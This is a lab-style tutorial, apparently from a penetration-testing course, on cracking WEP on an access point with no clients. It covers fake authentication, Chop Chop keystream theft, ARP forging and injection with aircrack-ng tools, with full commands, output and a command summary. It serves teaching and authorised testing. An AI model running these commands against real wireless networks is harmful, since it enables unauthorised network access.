---
title: Attacking WEP Access Points Without Clients
description: Attacking WEP Access Points Without Clients
date: '2026-09-22'
tags: []
published: true
slug: attacking-wep-access-points-without-clients
category: wifi
folder: diving-into-wep-attacks
order: 50
---
# Attacking WEP Access Points Without Clients

## What's the Problem?

Every WEP attack so far has needed **some kind of activity** on the network — a connected client, ARP traffic, or something to capture and replay. But what if the network is completely empty? **No clients, no traffic, nothing happening at all?**

This guide covers exactly that scenario: cracking WEP on a silent network with zero connected devices.

⚠️ **Fair warning:** This method doesn't always work — it depends on whether the router is vulnerable to "fake authentication." It tends to work better on **older routers**; many modern ones have been patched against this trick.

---

## The Basic Idea

1. **Fake our own connection** to the router (fake authentication) — pretending to be a legitimate client
2. Once "connected," run a **Fragmentation** or **Chop Chop** attack (from earlier guides) — but against ourselves this time, instead of a real client
3. Use the stolen keystream to **forge our own ARP packet**
4. Inject that forged packet to generate traffic and IVs
5. Crack the key as usual

This is essentially the same toolkit as before — just applied to a network with nobody else around, using a fake "client" (us) as the target.

---

## You'll Need 3 Terminals

| Terminal | Job |
|---|---|
| **1** | Capture traffic (airodump-ng) |
| **2** | Fake-authenticate with the router, staying "connected" |
| **3** | Run the fragmentation/chop chop attack, then inject the forged packet |

---

## Terminal 1: Start Capturing

```shellsession
iccys@htb[/htb]$ sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP

 CH  1 ][ Elapsed: 4 mins ][ 2024-08-10 19:01
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 60:38:E0:71:E9:DC  -47 100     2825       44    0   3   11   WEP  WEP         Virt-Corp
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Notice: no clients listed at all — an empty **STATION** section. This confirms the network is quiet, and normal ARP/fragmentation attacks won't have anything to work with yet.

---

## Terminal 2: Fake Authentication

This is the key trick — we pretend to be a real client connecting to the router:

```shellsession
iccys@htb[/htb]$ aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

Sending Authentication Request
Authentication successful
Sending Association Request
Association successful :-)
```

**What each part means:**

| Part | Meaning |
|---|---|
| `-1` | Fake authentication attack mode |
| `1000` | Re-association interval (in seconds) |
| `-o 1` | Send one set of packets at a time |
| `-q 5` | Send a "keep-alive" packet every 5 seconds (stops the router from dropping us) |
| `-e` | The network's name (ESSID) |
| `-a` | The router's MAC address (BSSID) |
| `-h` | **Our own** interface's MAC address — we're pretending this is a legit client |

🎉 **"Association successful"** means it worked — the router now thinks we're a genuine connected device.

**Confirm it worked** by checking Terminal 1 again:

```shellsession
iccys@htb[/htb]$ sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP

 CH  1 ][ Elapsed: 4 mins ][ 2024-08-10 19:01
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 60:38:E0:71:E9:DC  -47 100     2825       44    0   3   11   WEP  WEP         Virt-Corp
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 
 60:38:E0:71:E9:DC  00:c0:ca:98:3e:e0  -29    0 - 1      0    13847         Virt-Corp   
```

Notice our own MAC address (`00:c0:ca:98:3e:e0`) now shows up as a connected **STATION** — we successfully faked our way in.

---

## Terminal 3: Run a Chop Chop (or Fragmentation) Attack — On Ourselves

Now that we're "connected," we can run the same Chop Chop attack from an earlier guide — except this time, `-h` points to **our own MAC address**, since we're the only "client" available:

```shellsession
iccys@htb[/htb]$ aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

Read 667 packets...

        Size: 392, FromDS: 1, ToDS: 0 (WEP)

              BSSID  =  60:38:E0:71:E9:DC
          Dest. MAC  =  00:c0:ca:98:3e:e0
         Source MAC  =  60:38:E0:71:E9:DC

Use this packet ? y

Offset  389 ( 0% done) | xor = 9A | pt = AF |   58 frames written in  1067ms
Offset  388 ( 0% done) | xor = B4 | pt = AB |  178 frames written in  3212ms
Offset  387 ( 1% done) | xor = F8 | pt = CB |  244 frames written in  4395ms
<snip>
Saving plaintext in replay_dec-1229-160018.cap
Saving keystream in replay_dec-1229-160018.xor
```

💡 You could also use `-5` here instead for a Fragmentation attack — same idea, just a different method for stealing the keystream (both were covered in earlier guides).

Either way, you end up with a `.xor` file containing the stolen keystream.

---

## Forge an ARP Packet

```shellsession
iccys@htb[/htb]$ packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap
```

**What each part means:**

| Part | Meaning |
|---|---|
| `-0` | Build an ARP request |
| `-a` | Router's MAC address |
| `-h` | Our own interface's MAC (the fake "client") |
| `-k` | Guessed destination IP |
| `-l` | Guessed source IP |
| `-y` | Our stolen keystream file |
| `-w` | Output filename |

📝 **Don't know the real IPs?** No problem — just use `255.255.255.0` or `255.255.255.255` for both `-k` and `-l`, same trick from the packetforge-ng guide.

---

## Inject the Forged Packet

```shellsession
iccys@htb[/htb]$ aireplay-ng -2 -r forgedarp.cap wlan0mon

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  60:38:E0:71:E9:DC
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  00:c0:ca:98:3e:e0
Use this packet ? y
```

Confirm with `y`, and it starts sending — generating IVs for us, even though there's no actual "real" traffic on this network.

💡 **Speed it up:** You can also run an ARP request replay attack alongside this (from an earlier guide) to accelerate IV generation even further.

---

## Crack the Key

Once you've got enough IVs, run aircrack-ng as always:

```shellsession
iccys@htb[/htb]$ sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap

                                                 Aircrack-ng 1.7 


                                   [00:00:00] Tested 2 keys (got 26962 IVs)

   KB    depth   byte(vote)
    0    0/  1   26(36352) C7(35328) 2B(34560) 6D(33024) B2(32512) 06(32000) 28(32000) D7(32000) 
    1    0/  1   27(37888) 4B(35328) BD(33536) 77(32768) 26(32512) AE(32512) 68(32000) 87(32000) 
    2    0/  1   F6(40448) E2(34304) 2B(34048) 89(34048) 31(33536) 99(33280) 9F(33280) DE(33280) 
    3    0/  1   85(35072) 7D(34304) 0D(34048) C1(33536) 55(32256) F7(32000) 36(31744) 79(31744) 
    4    0/  1   97(34816) 1C(34048) F3(34048) AD(33280) 61(33024) 3C(32768) 84(32768) 02(32512) 

                         KEY FOUND! [ 26:27:F6:85:97 ] 
        Decrypted correctly: 100%
```

🎉 **Success!** The WEP key was recovered: `26:27:F6:85:97` — all without a single other client on the network.

---

## The Big Caveat

📝 **This trick mostly only works on older routers.** Modern routers have generally been patched to not generate any broadcast traffic (like ARP responses) toward fake-authenticated "clients" — which shuts this whole method down before it can even start. Always try it, but don't be surprised if it fails on newer hardware.

---

## Command Summary

```bash
sudo airodump-ng -c 3 --bssid <BSSID> wlan0mon -w WEP                        # Terminal 1: capture traffic
aireplay-ng -1 1000 -o 1 -q 5 -e <ESSID> -a <BSSID> -h <your MAC> wlan0mon  # Terminal 2: fake authentication
aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon                            # Terminal 3: Chop Chop attack (on yourself)
packetforge-ng -0 -a <BSSID> -h <your MAC> -k <dest IP> -l <src IP> -y <keystream.xor> -w forgedarp.cap   # Forge ARP packet
aireplay-ng -2 -r forgedarp.cap wlan0mon                                    # Inject the forged packet
sudo aircrack-ng -b <BSSID> WEP-01.cap                                       # Crack the WEP key
```

**What each argument means:**

| Argument | Meaning |
|---|---|
| `-1 1000` | Fake authentication mode, re-associate every 1000 seconds |
| `-o 1` | Send one set of packets at a time |
| `-q 5` | Keep-alive packet every 5 seconds |
| `-e <ESSID>` | The target network's name |
| `-a <BSSID>` | The target router's MAC address |
| `-h <your MAC>` | Your own interface's MAC address (used as the fake client) |
| `-4` | Korek Chop Chop attack mode |
| `-5` | Fragmentation attack mode (alternative to `-4`) |
| `-0` (packetforge-ng) | Build an ARP request |
| `-k` / `-l` | Destination/source IP (use `255.255.255.255` if unknown) |
| `-y` | The stolen keystream file |
| `-2` | Interactive packet replay mode |

